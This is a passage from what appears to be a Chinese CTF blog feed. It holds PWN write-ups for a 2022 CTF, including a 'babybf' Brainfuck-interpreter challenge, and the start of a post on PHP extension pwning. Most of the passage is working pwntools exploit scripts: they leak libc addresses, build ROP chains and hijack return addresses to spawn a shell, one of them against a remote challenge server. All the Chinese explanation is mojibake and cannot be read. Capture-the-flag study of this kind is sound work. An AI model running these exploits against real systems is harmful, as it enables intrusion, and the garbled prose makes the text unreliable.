class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">rop1+=p32(puts_plt)+p32(movr0)+p32(mainaddr)*<span class="number">10</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;comment&gt;&quot;</span>,rop1)</span><br><span class="line">data = p.recvline()</span><br><span class="line">libc_base = u32(data[<span class="number">1</span>:<span class="number">5</span>]) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(data)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(binsh)</span><br><span class="line"><span class="comment">#attack ret addr-----&gt;system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">rop2=p32(popr1)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(binsh)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(popr2)</span><br><span class="line">rop2+=p32(system)+p32(movr0)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;msg&gt;&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x2c</span>+rop2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>##babybf:<br>æ­¤é¢˜æ˜¯ç»§qwntåšå‡ºçš„ç¬¬äºŒä¸ªBrainfuckè§£é‡Šå™¨PWNé¢˜ï¼Œå®ƒæœ‰ä¸€å¥—è‡ªå·±çš„ç¬¦å·ï¼Œç±»ä¼¼äºvmï¼Œä¹Ÿç®—ä¸€ä¸ªvmé¢˜ï¼Œé€šè¿‡ç§»åŠ¨æŒ‡é’ˆæ¥è¿›è¡Œè¶Šç•Œå†™å’Œè¶Šç•Œè¯»ï¼Œè¿™é¢˜å°±æ˜¯é€šè¿‡ç§»åŠ¨æŒ‡é’ˆæ¥è¶Šç•Œè¯»å’Œè¶Šç•Œå†™ï¼Œæ¥åˆ—ä¸¾ä¸‹breainfuckf</p><pre><code>| Brainfuck | C                                                            || --------- | ------------------------------------------------------------ || &gt;         | ++ptr;                                                       || &lt;         | --ptr;                                                       || +         | ++*ptr;                                                      || -         | --*ptr;                                                      || .         | putchar(*ptr); || ,         | *ptr =getch();                                               || [         | while (*ptr) &#123;                                               || ]         | &#125;                                                            |</code></pre><p>é€šè¿‡&gt;ç§»åŠ¨87ä½ç½®æ³„éœ²libcï¼Œå†æ¬¡é€šè¿‡&gt;ç§»åŠ¨56æ¬¡æ¥åŠ«æŒè¿”å›åœ°å€ropå³å¯<br>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;47.108.29.107&#x27;</span>,<span class="number">10472</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/roo/Desktop/tools/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendcode</span>(<span class="params">length,code</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;len&gt; &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;code&gt; &quot;</span>,code)</span><br><span class="line"><span class="comment">#pay=&quot;&gt;&quot;</span></span><br><span class="line">pay=<span class="string">&quot;&gt;&quot;</span>*<span class="number">87</span></span><br><span class="line">pay+=<span class="string">&quot;&gt;.&quot;</span>*<span class="number">9</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sendcode(<span class="built_in">len</span>(pay),pay)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21b97</span>-<span class="number">0xf0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libcbase)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rce1=libcbase+<span class="number">0x10a2fc</span></span><br><span class="line">rce2=libcbase+<span class="number">0x4f322</span></span><br><span class="line">rce3=libcbase+<span class="number">0x10a38c</span></span><br><span class="line">poprdi=libcbase+<span class="number">0x000000000002164f</span></span><br><span class="line">poprsi=libcbase+<span class="number">0x0000000000023a6a</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(rce1)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rce1)</span><br><span class="line"><span class="comment"># rce_1=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_2=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_3=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_4=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_5=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_6=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_7=rce1&amp;0xff</span></span><br><span class="line">pay2=<span class="string">&quot;-&quot;</span>*<span class="number">40</span></span><br><span class="line"><span class="comment">#pay2+=&quot;,&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sendcode(<span class="built_in">len</span>(pay2),pay2)</span><br><span class="line">pay3=<span class="string">&quot;&gt;&quot;</span>*<span class="number">56</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">sendcode(<span class="built_in">len</span>(pay3),pay3)</span><br><span class="line">rop=p64(libcbase+<span class="number">0x000000000002155f</span>)+p64(binsh)+p64(system)</span><br><span class="line">p.send(p64(libcbase+<span class="number">0x00000000000008aa</span>))</span><br><span class="line">p.send(p64(libcbase+<span class="number">0x000000000002164f</span>))</span><br><span class="line">p.send(p64(binsh))</span><br><span class="line">p.send(p64(system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2022å®‰æ´µæ¯-CTF-PWN-wp&quot;&gt;&lt;a href=&quot;#2022å®‰æ´µæ¯-CTF-PWN-wp&quot; class=&quot;headerlink&quot; title=&quot;2022å®‰æ´µæ¯ CTF PWN wp&quot;&gt;&lt;/a&gt;2022å®‰æ´µæ¯ CTF PWN wp&lt;/h1&gt;&lt;p&gt;##å‰è¨€ï¼šä¸Š</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>éå¸¸è§„PWN</title>
    <link href="https://jsjsj.top/2022/10/03/%E9%9D%9E%E5%B8%B8%E8%A7%84PWN/"/>
    <id>https://jsjsj.top/2022/10/03/%E9%9D%9E%E5%B8%B8%E8%A7%84PWN/</id>
    <published>2022-10-03T14:13:56.000Z</published>
    <updated>2023-10-03T14:30:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="éå¸¸è§„PWN-Web-pwn-ä¸€"><a href="#éå¸¸è§„PWN-Web-pwn-ä¸€" class="headerlink" title="éå¸¸è§„PWN&amp;Web pwn(ä¸€)"></a>éå¸¸è§„PWN&amp;Web pwn(ä¸€)</h1><h3 id="å‰è¨€ï¼šæœ€è¿‘åœ¨å­¦éå¸¸è§„pwnï¼Œç„¶åæƒ³åˆ°äº†ä¹‹å‰çš„php-pwnï¼Œç„¶åå°±è§‰å¾—å¾ˆæœ‰æ„æ€ï¼ŒåŸæ¥PHPä¹Ÿå¯ä»¥è¢«pwnï¼ˆä¹Ÿè®¸æˆ‘æ˜¯åœŸğŸ•ï¼Œä¹‹å‰ä¸€ç›´æƒ³å¤ç°å­¦ä¹ ï¼Œä¸€ç›´æ‹–åˆ°ç°åœ¨ï¼Œå…¶å®web-php-pwnåœ¨å‰ä¸¤å¹´å›½é™…æ¯”èµ›ä¸­è€ƒå¯Ÿçš„å¾ˆå¤šï¼Œæ„Ÿè§‰ä¹Ÿå¾ˆåå‘äºå®æˆ˜webï¼Œæ‰€ä»¥æœ¬ç¯‡æ¥å™è¿°ä¸‹ï¼Œæœ€åå†ä»¥2020De1CTF-mixtureè¿™é“é¢˜å™è¿°ä¸‹ç®€å•çš„åšé¢˜æŠ€å·§ï¼ˆè¿™ä¸ªå¤§æ¦‚æ”¾åœ¨ç¬¬äºŒç¯‡ç« é‡Œ"><a href="#å‰è¨€ï¼šæœ€è¿‘åœ¨å­¦éå¸¸è§„pwnï¼Œç„¶åæƒ³åˆ°äº†ä¹‹å‰çš„php-pwnï¼Œç„¶åå°±è§‰å¾—å¾ˆæœ‰æ„æ€ï¼ŒåŸæ¥PHPä¹Ÿå¯ä»¥è¢«pwnï¼ˆä¹Ÿè®¸æˆ‘æ˜¯åœŸğŸ•ï¼Œä¹‹å‰ä¸€ç›´æƒ³å¤ç°å­¦ä¹ ï¼Œä¸€ç›´æ‹–åˆ°ç°åœ¨ï¼Œå…¶å®web-php-pwnåœ¨å‰ä¸¤å¹´å›½é™…æ¯”èµ›ä¸­è€ƒå¯Ÿçš„å¾ˆå¤šï¼Œæ„Ÿè§‰ä¹Ÿå¾ˆåå‘äºå®æˆ˜webï¼Œæ‰€ä»¥æœ¬ç¯‡æ¥å™è¿°ä¸‹ï¼Œæœ€åå†ä»¥2020De1CTF-mixtureè¿™é“é¢˜å™è¿°ä¸‹ç®€å•çš„åšé¢˜æŠ€å·§ï¼ˆè¿™ä¸ªå¤§æ¦‚æ”¾åœ¨ç¬¬äºŒç¯‡ç« é‡Œ" class="headerlink" title="å‰è¨€ï¼šæœ€è¿‘åœ¨å­¦éå¸¸è§„pwnï¼Œç„¶åæƒ³åˆ°äº†ä¹‹å‰çš„php pwnï¼Œç„¶åå°±è§‰å¾—å¾ˆæœ‰æ„æ€ï¼ŒåŸæ¥PHPä¹Ÿå¯ä»¥è¢«pwnï¼ˆä¹Ÿè®¸æˆ‘æ˜¯åœŸğŸ•ï¼Œä¹‹å‰ä¸€ç›´æƒ³å¤ç°å­¦ä¹ ï¼Œä¸€ç›´æ‹–åˆ°ç°åœ¨ï¼Œå…¶å®web(php) pwnåœ¨å‰ä¸¤å¹´å›½é™…æ¯”èµ›ä¸­è€ƒå¯Ÿçš„å¾ˆå¤šï¼Œæ„Ÿè§‰ä¹Ÿå¾ˆåå‘äºå®æˆ˜webï¼Œæ‰€ä»¥æœ¬ç¯‡æ¥å™è¿°ä¸‹ï¼Œæœ€åå†ä»¥2020De1CTF-mixtureè¿™é“é¢˜å™è¿°ä¸‹ç®€å•çš„åšé¢˜æŠ€å·§ï¼ˆè¿™ä¸ªå¤§æ¦‚æ”¾åœ¨ç¬¬äºŒç¯‡ç« é‡Œ"></a>å‰è¨€ï¼šæœ€è¿‘åœ¨å­¦éå¸¸è§„pwnï¼Œç„¶åæƒ³åˆ°äº†ä¹‹å‰çš„php pwnï¼Œç„¶åå°±è§‰å¾—å¾ˆæœ‰æ„æ€ï¼ŒåŸæ¥PHPä¹Ÿå¯ä»¥è¢«pwnï¼ˆä¹Ÿè®¸æˆ‘æ˜¯åœŸğŸ•ï¼Œä¹‹å‰ä¸€ç›´æƒ³å¤ç°å­¦ä¹ ï¼Œä¸€ç›´æ‹–åˆ°ç°åœ¨ï¼Œå…¶å®web(php) pwnåœ¨å‰ä¸¤å¹´å›½é™…æ¯”èµ›ä¸­è€ƒå¯Ÿçš„å¾ˆå¤šï¼Œæ„Ÿè§‰ä¹Ÿå¾ˆåå‘äºå®æˆ˜webï¼Œæ‰€ä»¥æœ¬ç¯‡æ¥å™è¿°ä¸‹ï¼Œæœ€åå†ä»¥2020De1CTF-mixtureè¿™é“é¢˜å™è¿°ä¸‹ç®€å•çš„åšé¢˜æŠ€å·§ï¼ˆè¿™ä¸ªå¤§æ¦‚æ”¾åœ¨ç¬¬äºŒç¯‡ç« é‡Œ</h3><h2 id="php-ç¯å¢ƒæ­å»º"><a href="#php-ç¯å¢ƒæ­å»º" class="headerlink" title="php ç¯å¢ƒæ­å»º"></a>php ç¯å¢ƒæ­å»º</h2><p>ç¬¬ä¸€æ­¥æˆ‘ä»¬éœ€è¦åœ¨Ubuntué‡Œå®‰è£…ä¸ªphpçš„ç¯å¢ƒã€‚å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php7.2 </span><br><span class="line">sudo apt install php-dev</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä¸‹è½½çš„æ˜¯php7.2ç¯å¢ƒï¼Œå› ä¸ºé¢˜ç›®ç¯å¢ƒphpç‰ˆæœ¬ä¹Ÿæ˜¯è¿™ä¸ªç‰ˆæœ¬ï¼Œç„¶åå»æ‰¾åˆ°å¯¹åº”çš„æºç ç¼–è¯‘ä¸‹æºç ï¼Œæºç æ¨èï¼š<a href="https://www.php.net/downloads.php">https://www.php.net/downloads.php</a>   <a href="https://www.php.net/distributions/php-7.2.31.tar.xz">https://www.php.net/distributions/php-7.2.31.tar.xz</a></p><p>ç„¶åæˆ‘ä»¬çœ‹ä¸‹æºç çš„ç›®å½•ï¼Œæ¯ä¸ªç›®å½•çš„ä½œç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. build å’Œç¼–è¯‘æœ‰å…³çš„ç›®å½•ã€‚</span><br><span class="line">2. ext æ‰©å±•åº“ä»£ç ï¼Œä¾‹å¦‚ MySQLã€zlibã€iconv ç­‰æˆ‘ä»¬ç†Ÿæ‚‰çš„æ‰©å±•åº“ã€‚å…¶ä¸­/ext/standard/ ç›®å½•ä¸‹æ˜¯å¸¸ç”¨çš„æ ‡å‡†å‡½æ•°é›†ã€‚</span><br><span class="line">3. main ä¸»ç›®å½•åŒ…å«ä¸»è¦çš„ PHP å®å’Œå®šä¹‰ã€‚</span><br><span class="line">4. sapi å’Œå„ç§æœåŠ¡å™¨çš„æ¥å£è°ƒç”¨ï¼Œä¾‹å¦‚apacheã€IISç­‰ï¼Œä¹ŸåŒ…å«ä¸€èˆ¬çš„fastcgiã€cgiç­‰ã€‚</span><br><span class="line">5. win32 å’Œ Windows ä¸‹ç¼–è¯‘ PHP æœ‰å…³çš„è„šæœ¬ã€‚</span><br><span class="line">6. Zend æ–‡ä»¶å¤¹æ ¸å¿ƒçš„å¼•æ“ï¼Œæ‰€æœ‰çš„ Zend API å®šä¹‰ä¸å®ç­‰ã€‚</span><br><span class="line">7. scripts Linux ä¸‹çš„è„šæœ¬ç›®å½•ã€‚</span><br><span class="line">8. tests æµ‹è¯•è„šæœ¬ç›®å½•</span><br><span class="line">9. sapi å„ç±» Web æœåŠ¡å™¨çš„æ¥å£ã€‚</span><br><span class="line">10.TSRM Zend å’Œ PHP çš„ â€œçº¿ç¨‹å®‰å…¨èµ„æºç®¡ç†å™¨â€ (TSRM) ç›®å½•ã€‚</span><br><span class="line">11.pear è¿™ä¸ªç›®å½•å°±æ˜¯â€œPHP æ‰©å±•ä¸åº”ç”¨ä»“åº“â€çš„ç›®å½•ã€‚åŒ…å«äº†PEAR çš„æ ¸å¿ƒæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬è¦æƒ³è‡ªå·±ç¼–è¯‘çš„è¯ï¼Œåœ¨extç›®å½•é‡Œè¿›è¡Œç¼–è¯‘</p><p>å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=webpwn  #è‡ªå·±ç¼–è¯‘äº†ä¸ªæ‹“å±•åº“ webpwn</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›åˆ°ç›¸åº”ç›®å½•é‡Œï¼Œæˆ‘ä»¬çœ‹ä¸‹webpwn.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | PHP Version 7                                                        |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | Copyright (c) 1997-2018 The PHP Group                                |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | This source file is subject to version 3.01 of the PHP license,      |</span></span><br><span class="line"><span class="comment">  | that is bundled with this package in the file LICENSE, and is        |</span></span><br><span class="line"><span class="comment">  | available through the world-wide-web at the following url:           |</span></span><br><span class="line"><span class="comment">  | http://www.php.net/license/3_01.txt                                  |</span></span><br><span class="line"><span class="comment">  | If you did not receive a copy of the PHP license and are unable to   |</span></span><br><span class="line"><span class="comment">  | obtain it through the world-wide-web, please send a note to          |</span></span><br><span class="line"><span class="comment">  | license@php.net so we can mail you a copy immediately.               |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | Author:                                                              |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* $Id$ */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php_ini.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php_webpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* If you declare any globals in php_webpwn.h uncomment this:</span></span><br><span class="line"><span class="comment">ZEND_DECLARE_MODULE_GLOBALS(webpwn)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* True global resources - no need for thread safety here */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> le_webpwn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_INI</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* Remove comments and fill if you need to have entries in php.ini</span></span><br><span class="line"><span class="comment">PHP_INI_BEGIN()</span></span><br><span class="line"><span class="comment">    STD_PHP_INI_ENTRY(&quot;webpwn.global_value&quot;,      &quot;42&quot;, PHP_INI_ALL, OnUpdateLong, global_value, zend_webpwn_globals, webpwn_globals)</span></span><br><span class="line"><span class="comment">    STD_PHP_INI_ENTRY(&quot;webpwn.global_string&quot;, &quot;foobar&quot;, PHP_INI_ALL, OnUpdateString, global_string, zend_webpwn_globals, webpwn_globals)</span></span><br><span class="line"><span class="comment">PHP_INI_END()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove the following function when you have successfully modified config.m4</span></span><br><span class="line"><span class="comment">   so that your module can be compiled into PHP, it exists only for testing</span></span><br><span class="line"><span class="comment">   purposes. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Every user-visible function in PHP should document itself in the source */</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; proto string confirm_webpwn_compiled(string arg)</span></span><br><span class="line"><span class="comment">   Return a string to confirm that the module is compiled in */</span></span><br><span class="line">PHP_FUNCTION(confirm_webpwn_compiled)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">size_t</span> arg_len, len;</span><br><span class="line">zend_string *strg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strg = strpprintf(<span class="number">0</span>, <span class="string">&quot;Congratulations! You have successfully modified ext/%.78s/config.m4. Module %.78s is now compiled into PHP.&quot;</span>, <span class="string">&quot;webpwn&quot;</span>, arg);</span><br><span class="line"></span><br><span class="line">RETURN_STR(strg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="comment">/* The previous line is meant for vim and emacs, so it can correctly fold and</span></span><br><span class="line"><span class="comment">   unfold functions in source code. See the corresponding marks just before</span></span><br><span class="line"><span class="comment">   function definition, where the functions purpose is also documented. Please</span></span><br><span class="line"><span class="comment">   follow this convention for the convenience of others editing your code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; php_webpwn_init_globals</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* Uncomment this function if you have INI entries</span></span><br><span class="line"><span class="comment">static void php_webpwn_init_globals(zend_webpwn_globals 